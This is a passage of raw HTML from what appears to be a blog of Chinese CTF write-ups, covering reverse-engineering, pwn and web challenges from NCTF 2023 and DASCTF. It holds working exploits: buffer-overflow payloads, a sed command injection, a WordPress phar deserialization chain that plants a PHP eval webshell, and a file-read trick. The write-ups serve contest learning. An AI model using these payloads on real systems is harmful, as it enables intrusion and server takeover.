   + <span class="number">12</span> * ~(a1 | <span class="number">0xE33B67BD</span>))</span><br><span class="line">     + <span class="number">3</span> * (a1 &amp; <span class="number">0xD2C7FC0C</span>)</span><br><span class="line">     + <span class="number">-5</span> * a1</span><br><span class="line">     - <span class="number">2</span> * ~(a1 | <span class="number">0xD2C7FC0C</span>)</span><br><span class="line">     + ~(a1 | <span class="number">0x2D3803F3</span>)</span><br><span class="line">     + <span class="number">4</span> * (a1 &amp; <span class="number">0x2D3803F3</span>)</span><br><span class="line">     - <span class="number">-2</span> * (a1 | <span class="number">0x2D3803F3</span>) == <span class="number">0xCE1066DC</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;flag&#123;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> a = <span class="number">0xADB1D018</span>LL;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> b = a+<span class="number">0x36145344</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x&quot;</span>,b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">unsigned</span> <span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>^<span class="number">32</span> - <span class="number">1</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bbq = <span class="built_in">sub_1257</span>(i);</span><br><span class="line"><span class="keyword">if</span>(bbq==<span class="number">0LL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x&quot;</span>,i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">unsigned</span> <span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>^<span class="number">32</span> - <span class="number">1</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bbq = <span class="built_in">sub_12A4</span>(i);</span><br><span class="line"><span class="keyword">if</span>(bbq==<span class="number">0LL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x&quot;</span>,i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">unsigned</span> <span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>^<span class="number">32</span> - <span class="number">1</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bbq = <span class="built_in">sub_1346</span>(i);</span><br><span class="line"><span class="keyword">if</span>(bbq==<span class="number">0LL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x&quot;</span>,i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;e3c6235c-05d9434d-04b1edf3-04034083&#125;</span></span><br></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><ul><li>ret2text</li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;prob07.contest.pku.edu.cn&#x27;</span>, <span class="number">10007</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b<span class="string">&#x27;Please input your token: &#x27;</span>)</span><br><span class="line">p.sendline(b<span class="string">&#x27;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl&#x27;</span>)</span><br><span class="line">p.recvuntil(b<span class="string">&#x27;Enter your username: &#x27;</span>)</span><br><span class="line">p.sendline(b<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line"></span><br><span class="line">x = b<span class="string">&#x27;!@#$%^&amp;*()_+&#x27;</span></span><br><span class="line"><span class="built_in">offset</span>=<span class="number">0x38</span> - <span class="built_in">len</span>(x)</span><br><span class="line">payload = x + b<span class="string">&#x27;\x00&#x27;</span> * <span class="built_in">offset</span> + p64(<span class="number">0x40117A</span>)</span><br><span class="line">p.recvuntil(b<span class="string">&#x27;Enter the password: &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><p>密码处输入字符过长溢出，密码自己出来了<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714996681718-deba3f05-beb0-4cd5-9e82-68eaecfb43a3.png#averageHue=%230a0908&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=813&amp;id=u0a997292&amp;originHeight=1219&amp;originWidth=2530&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=222241&amp;status=done&amp;style=none&amp;taskId=u01241050-9a4a-48ce-b0b3-aedfd42c4f8&amp;title=&amp;width=1686.6666666666667" alt="image.png"><br>elf文件泄露，使用脚本提取</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;prob04.contest.pku.edu.cn&#x27;</span>, <span class="number">10004</span>, level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;Please input your token: &#x27;</span>,</span><br><span class="line">                b<span class="string">&#x27;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;Username:&#x27;</span>, b<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;Password:&#x27;</span>, b<span class="string">&#x27;1q2w3e4r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">data</span> = p.recvall()</span><br><span class="line">flag = <span class="keyword">data</span>.find(b<span class="string">&#x27;\x7fELF&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> flag ==-<span class="number">1</span>:</span><br><span class="line">    datas = <span class="keyword">data</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    datas = <span class="keyword">data</span>[flag:]</span><br><span class="line"></span><br><span class="line">with <span class="keyword">open</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(datas)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>提取成功，找到后门<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714996795308-bf233b5b-65dd-4af5-b558-fe74bf5ea687.png#averageHue=%23f9f7f5&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=121&amp;id=u6fa22c66&amp;originHeight=181&amp;originWidth=799&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=13303&amp;status=done&amp;style=none&amp;taskId=ub2c18f58-f686-4613-b1c0-efeb1434234&amp;title=&amp;width=532.6666666666666" alt="798c4c64bc527cfdfb112297a2aba3a.png"><br>找gadgets<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714996814489-e62ce271-ef49-48db-b399-d15b31f702e4.png#averageHue=%23300b25&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=85&amp;id=ub9c3ffa3&amp;originHeight=128&amp;originWidth=684&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=16770&amp;status=done&amp;style=none&amp;taskId=u188da057-fd77-40da-a627-cf123ca2a87&amp;title=&amp;width=456" alt="439b7b4556526a0ec73c101ae0b03e5b_.png"></p><ul><li>exp</li></ul><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="emphasis">&#x27;prob04.contest.pku.edu.cn&#x27;</span>, 10004, level=<span class="emphasis">&#x27;debug&#x27;</span>)</span><br><span class="line">p.sendlineafter(b&#x27;Please input your token: <span class="emphasis">&#x27;,</span></span><br><span class="line"><span class="emphasis">                b&#x27;</span>468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl&#x27;)</span><br><span class="line">p.sendlineafter(b&#x27;Username: <span class="emphasis">&#x27;, &#x27;</span>admin&#x27;)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"><span class="section">Gadgets information</span></span><br><span class="line"><span class="section">============================================================</span></span><br><span class="line">0x000000000040101a : ret</span><br><span class="line">0x0000000000401359 : ret 0x1be</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload = b&#x27;a&#x27; * 40 <span class="code">+ b&#x27;\x00&#x27; * (41 - 40) +</span> b&#x27;b&#x27; * (48 <span class="code">+ 96 - 41) +</span> p64(0x40101a) * 3 + p64(0x40127e)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b&#x27;Password: <span class="emphasis">&#x27;, payload)</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis"></span>p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714998007875-ba0fadb1-4b37-4774-988e-40dc7a35e266.png#averageHue=%2391959a&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=349&amp;id=ub001c975&amp;originHeight=524&amp;originWidth=1194&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=44000&amp;status=done&amp;style=none&amp;taskId=uf5f3f913-75d1-46c3-8d3f-c017298af16&amp;title=&amp;width=796" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Competition </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF 2023</title>
      <link href="/posts/b4f8e239.html"/>
      <url>/posts/b4f8e239.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Webshell-Generator"><a href="#Webshell-Generator" class="headerlink" title="Webshell Generator"></a>Webshell Generator</h2><p>题目是一个Webshell生成的功能，可以填写Webshell的语言（只有PHP）、访问方法、Webshell密码（通过前端限制格式为[A-Za-z0-9]）</p><p>生成完后会将其下载到本地</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190526171-82943956.png" alt="image-20240607190523741"></p><p>通过抓包发现可以任意下载文件，经测试发现无权限读取flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190535254-197244968.png" alt="image-20240607190533034"></p><p>尝试读取页面源码：<code>/download.php?file=index.php&amp;filename=webshell.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">security_validate</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\r|\n/&#x27;</span>, <span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;<span class="subst">$key</span> 不能包含换行符！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$value</span>) &gt; <span class="number">114</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;<span class="subst">$key</span> 不能超过114个字符！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">security_validate</span>();</span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>] &amp;&amp; @<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>] &amp;&amp; @<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;language&#x27;</span>] !== <span class="string">&#x27;PHP&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;PHP是最好的语言&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$method</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>];</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;METHOD=<span class="subst">$method</span>&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;你的method太复杂了！&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;KEY=<span class="subst">$key</span>&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;你的key太复杂了！&quot;</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = -<span class="number">1</span>;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;sh generate.sh&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;生成失败了！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: download.php?file=<span class="subst">$filename</span>&amp;filename=<span class="subst">&#123;$_POST[&#x27;filename&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现在代码中会调用<code>sh generate.sh</code>，可以得到相关代码：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/download.php?file=generate.sh&amp;filename=webshell.php</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line">NEW_FILENAME=$(<span class="built_in">tr</span> -dc a-z0-9 &lt;/dev/urandom | <span class="built_in">head</span> -c 16)</span><br><span class="line"><span class="built_in">cp</span> template.php <span class="string">&quot;/tmp/<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&quot;s/KEY/<span class="variable">$KEY</span>/g&quot;</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line">sed -i <span class="string">&quot;s/METHOD/<span class="variable">$METHOD</span>/g&quot;</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">realpath</span> <span class="string">&quot;<span class="variable">$NEW_FILENAME</span>&quot;</span></span><br></pre></td></tr></table></figure><p>发现在<code>generate.sh</code>中会使用<code>set -i</code>将环境变量<code>KEY</code>和<code>METHOD</code>替换为文件中的内容，而php代码中使用<code>putenv</code>设置环境变量，所以只要控制其中一个或两个值即可</p><p>exp：提交key为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/g;e/readflag;s<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">/g;：闭合前面的 s/</span><br><span class="line">e：执行命令</span><br><span class="line">/readflag;：提示中说运行这个即可获得flag</span><br><span class="line">s<span class="comment">//：闭合后面的/g</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190552762-2119695271.png" alt="image-20240607190550342"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190556639-134092447.png" alt="image-20240607190554348"></p><h2 id="Wait-What"><a href="#Wait-What" class="headerlink" title="Wait What?"></a>Wait What?</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190606246-2132198011.png" alt="image-20240607190604100"></p><p>查看源码发现每个函数里都存在着<code>text()</code>的方法，尝试从这里出发</p><p>审计代码，查找资料，得知在g全局模式下，重复调用test进行匹配会出现真假交替的情况</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190614195-1972211957.png" alt="image-20240607190611970"></p><p>所以如果能触发两次test方法可以绕过黑名单</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190620126-874619407.png" alt="image-20240607190617928"></p><p>而更新正则对象的部分在<code>try_catch</code>中，所以如果报错就能阻止正则对象的更新，因为对象不能像数组那样遍历取值，所以用对象来报错</p><p><code>/api/ban_user</code>接口传入<code>&#123;&quot;username&quot;:&quot;user&quot;,&quot;password&quot;:&quot;user&quot;,&quot;ban_username&quot;:&#123;&quot;a&quot;:&quot;b&quot;&#125;&#125;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190630964-1814062245.png" alt="image-20240607190628711"></p><p>发现利用报错成功阻止了正则对象的更新，接下来只需要利用admin的身份请求两次flag即可，第一次请求为了将<code>ban_user</code>名单替换成我们更新的<code>user</code>第二次则可以成功请求到flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190639137-1948604582.png" alt="image-20240607190636955"></p><h2 id="ez-wordpress"><a href="#ez-wordpress" class="headerlink" title="ez_wordpress"></a>ez_wordpress</h2><p>先看提示：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190653522-233680141.png" alt="image-20240607190651035"></p><p>信息搜集直接用wpscan扫一下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://124.71.184.68:8012/ -e --api-token xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure><p>根据提示，看下6.4.1版本的数据：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190703799-1163223648.png" alt="image-20240607190701298"></p><p>是一个关于POP链的漏洞<a href="https://fenrisk.com/publications/blogpost/2023/11/22/gadgets-chain-in-wordpress/">第三方链接</a></p><p>看文章后可以通过<code>call_user_func</code>，来找到反序列化链子</p><p>发现有<code>all-in-one-video-gallery</code>插件的漏洞</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190714231-1846360800.png" alt="image-20240607190711659"></p><p>该插件存在任意文件读取的cve，操控dl参数实现</p><p>再找到drag-and-drop-multiple-file-upload-contact-form-7的上传，参考<a href="https://www.exploit-db.com/exploits/48520">Drag and Drop File Upload</a></p><p>根据提示以及结合上面的内容，可以知道利用任意文件上传+ssrf任意文件读取触发phar反序列化</p><p>通过phpggc生成phar文件 </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc WordPress/RCE2 system <span class="string">&quot;echo PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7|base64 -d &gt; a.php&quot;</span> -p phar -o a.png</span><br></pre></td></tr></table></figure><p>然后上传文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://124.71.184.68:8012//wp-admin/admin-ajax.php&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;supported_type&quot;</span>:<span class="string">&quot;png&quot;</span>,</span><br><span class="line">    <span class="string">&quot;size_limit&quot;</span>:<span class="string">&quot;5242880&quot;</span>,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>:<span class="string">&quot;dnd_codedropz_upload&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>:<span class="string">&quot;click&quot;</span>,</span><br><span class="line">    <span class="string">&quot;security&quot;</span>:<span class="string">&quot;b738e27dac&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data=data,files=&#123;<span class="string">&#x27;upload-file&#x27;</span>:(<span class="string">&#x27;logo.png&#x27;</span>,<span class="built_in">open</span>(<span class="string">&#x27;./a.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>))&#125;</span><br><span class="line">                 )</span><br><span class="line"><span class="built_in">print</span>(r.content)</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190732772-826009879.png" alt="image-20240607190730380">然后触发phar</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.71.184.68:8012/index.php/video/?dl=cGhhcjovLy92YXIvd3d3L2h0bWwvd3AtY29udGVudC91cGxvYWRzL3dwX2RuZGNmN191cGxvYWRzL3dwY2Y3LWZpbGVzL2xvZ28ucG5nL3Rlc3QudHh0</span><br></pre></td></tr></table></figure><p>拿蚁剑连接</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190741554-1085633327.png" alt="image-20240607190739159"></p><p>连接成功，但是flag没有读取权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190752853-2055503162.png" alt="image-20240607190750707"></p><p>用date命令就拿到flag了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">date</span> -f /flag</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607190759425-1847162763.png" alt="image-20240607190757156"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Competition </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF X 0psu3十一月挑战赛 2023</title>
      <link href="/posts/1ea185c6.html"/>
      <url>/posts/1ea185c6.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="realrce"><a href="#realrce" class="headerlink" title="realrce"></a>realrce</h2><p>附件中有源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">input_code</span>) &#123;</span><br><span class="line">    bypasspin = <span class="regexp">/%[0-9a-fA-F]&#123;2&#125;/i</span>;</span><br><span class="line">    <span class="keyword">const</span> bypasscode = bypasspin.<span class="title function_">test</span>(input_code);</span><br><span class="line">    <span class="keyword">if</span> (bypasscode) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">waf</span>(<span class="built_in">decodeURIComponent</span>(input_code));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error decoding input: &quot;</span>, error);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> blacklist = [<span class="regexp">/__proto__/i</span>, <span class="regexp">/constructor/i</span>, <span class="regexp">/prototype/i</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> blackword <span class="keyword">of</span> blacklist) &#123;</span><br><span class="line">        <span class="keyword">if</span> (blackword.<span class="title function_">test</span>(input_code)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用报错来绕过waf进行原型链污染</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">LockCylinder</span>(<span 